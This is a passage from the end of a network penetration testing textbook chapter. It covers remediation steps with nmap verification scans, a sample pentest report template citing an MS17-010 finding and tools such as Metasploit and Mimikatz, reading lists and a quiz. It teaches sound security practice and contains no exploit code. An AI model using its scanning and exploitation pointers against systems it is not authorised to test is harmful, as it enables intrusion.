Critical servers (192.168.1.100-105) are accessible from user workstations (192.168.2.0/24) without restrictions.

### Remediation Steps
1. **High Priority**: Implement network segmentation using VLANs and firewall rules
   - Create separate VLANs for servers, workstations, and IoT devices
   - Configure firewall rules to restrict traffic between segments
   - Allow only necessary services between segments

2. **Medium Priority**: Implement a zero-trust network model
   - Deploy a NAC (Network Access Control) solution
   - Require authentication for all network connections
   - Implement micro-segmentation for critical assets

3. **Verification**: Test segmentation effectiveness with:
   ```bash
   nmap -sT -p 1-1024 192.168.1.100 # From workstation VLAN
   ```

## 3. Insecure Authentication Mechanisms

### Finding
Multiple services use basic authentication over unencrypted channels, including FTP and HTTP.

### Remediation Steps
1. **High Priority**: Replace insecure protocols with encrypted alternatives
   - Replace FTP with SFTP or FTPS
   - Replace HTTP with HTTPS (implement TLS 1.2+)
   - Disable Telnet in favor of SSH

2. **Medium Priority**: Implement strong authentication
   - Deploy multi-factor authentication where possible
   - Enforce strong password policies
   - Implement account lockout policies

3. **Verification**: Confirm encrypted protocols are in use:
   ```bash
   nmap -sV --script ssl-enum-ciphers -p 21,22,80,443 192.168.1.100
   ```
```

### 7.3 Penetration Testing Reports

Creating comprehensive penetration testing reports:

1. **Report Components**:
   - Executive summary
   - Methodology
   - Findings and vulnerabilities
   - Risk assessment
   - Remediation recommendations
   - Technical appendices

2. **Report Types**:
   - Executive report (non-technical)
   - Technical report (detailed findings)
   - Remediation roadmap
   - Compliance-focused report
   - Re-test report

3. **Reporting Best Practices**:
   - Clear, concise language
   - Visual aids (charts, diagrams)
   - Risk-based prioritization
   - Actionable recommendations
   - Evidence-based findings

```markdown
# Example: Network Penetration Test Report Structure

# Network Penetration Test Report
## Company: Example Corporation
## Date: March 15, 2023

---

## 1. Executive Summary

### 1.1 Overview
This report presents the findings of a network penetration test conducted for Example Corporation between March 1-15, 2023. The assessment focused on the internal network infrastructure, including servers, network devices, and critical services.

### 1.2 Key Findings
- **Critical Risk (2)**: Remote code execution vulnerabilities in file servers; default credentials on network devices
- **High Risk (5)**: Outdated software with known vulnerabilities; weak network segmentation; insecure authentication mechanisms
- **Medium Risk (8)**: Misconfigured services; excessive user privileges; unencrypted data transmission
- **Low Risk (12)**: Information disclosure; missing security headers; outdated TLS configurations

### 1.3 Risk Summary Chart
[Insert risk distribution chart]

### 1.4 Recommendation Summary
Immediate actions required:
1. Apply security patches to file servers vulnerable to MS17-010
2. Change default credentials on all network devices
3. Implement network segmentation between critical systems and user networks
4. Upgrade or replace systems running end-of-life software

---

## 2. Methodology

### 2.1 Approach
The assessment followed a structured methodology:
1. Reconnaissance and discovery
2. Vulnerability scanning and enumeration
3. Manual vulnerability verification
4. Exploitation and post-exploitation
5. Documentation and reporting

### 2.2 Tools Used
- Network scanning: Nmap, Masscan
- Vulnerability assessment: Nessus, OpenVAS
- Exploitation: Metasploit Framework, custom scripts
- Traffic analysis: Wireshark, tcpdump
- Post-exploitation: Empire, Mimikatz

### 2.3 Scope
The assessment covered:
- Internal IP range: 192.168.0.0/16
- Network infrastructure devices
- Windows and Linux servers
- Critical business applications
- Authentication systems

---

## 3. Detailed Findings

### 3.1 Critical Findings

#### 3.1.1 MS17-010 SMB Vulnerability (Critical)
**Affected Systems**: FILESERVER01 (192.168.1.100), FILESERVER02 (192.168.1.101)

**Description**: The file servers are vulnerable to MS17-010 (EternalBlue), which allows remote code execution via specially crafted packets to the SMB service.

**Evidence**: [Include screenshot of vulnerability scan and exploitation]

**Impact**: An attacker could gain SYSTEM level access to the file servers, potentially accessing sensitive data or using the servers as a pivot point to attack other systems.

**Recommendation**: Immediately apply Microsoft security patch for MS17-010 and disable SMBv1 on all Windows systems.

#### 3.1.2 Default Credentials on Network Devices (Critical)
...

### 3.2 High Risk Findings
...

### 3.3 Medium Risk Findings
...

### 3.4 Low Risk Findings
...

---

## 4. Remediation Roadmap

### 4.1 Immediate Actions (0-7 days)
...

### 4.2 Short-term Actions (7-30 days)
...

### 4.3 Long-term Actions (30-90 days)
...

---

## 5. Appendices

### 5.1 Vulnerability Scan Results
...

### 5.2 Exploitation Proof of Concept
...

### 5.3 Network Diagram
...

### 5.4 Testing Timeline
...
```

> **Knowledge Check:** What are the key components of an effective penetration testing report? How should findings be prioritized and presented to maximize value for the organization?

## Summary

In this chapter, we've explored network penetration testing in depth:

- The methodology and approaches for network penetration testing
- Techniques for network reconnaissance, discovery, and enumeration
- Methods for identifying and assessing network vulnerabilities
- Common network-based attacks and exploitation techniques
- Post-exploitation activities including privilege escalation and pivoting
- Documentation and reporting best practices for network penetration tests

Network penetration testing is a critical component of a comprehensive security program. By identifying and addressing network vulnerabilities before malicious actors can exploit them, organizations can significantly improve their security posture and reduce the risk of successful attacks.

## Additional Resources

### Books
- "Network Security Assessment" by Chris McNab
- "The Hacker Playbook 3" by Peter Kim
- "Black Hat Python" by Justin Seitz and Tim Arnold
- "Rtfm: Red Team Field Manual" by Ben Clark
- "Network Attacks and Exploitation: A Framework" by Matthew Monte

### Online Resources
- [SANS Penetration Testing Resources](https://www.sans.org/security-resources/sec560/netpen_tools_10_2.pdf)
- [Offensive Security Proving Grounds](https://www.offensive-security.com/labs/)
- [HackTricks Network Pentesting Guide](https://book.hacktricks.xyz/pentesting/pentesting-network)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [NIST SP 800-115: Technical Guide to Information Security Testing](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)

### Tools
- [Nmap Security Scanner](https://nmap.org/)
- [Metasploit Framework](https://www.metasploit.com/)
- [Wireshark](https://www.wireshark.org/)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

## Next Steps

In the next chapter, we'll focus on web application penetration testing, exploring techniques for identifying and exploiting vulnerabilities in web applications, including authentication bypass, injection flaws, cross-site scripting, and other common web vulnerabilities.

---

## Chapter Quiz

Test your understanding of network penetration testing:

1. What are the key differences between passive and active network reconnaissance?
2. Explain the concept of network pivoting and why it's important in penetration testing.
3. What tools would you use to perform a comprehensive network vulnerability assessment?
4. Describe three common network service vulnerabilities and how they can be exploited.
5. What information should be included when documenting a critical vulnerability in a penetration test report?

Good luck!
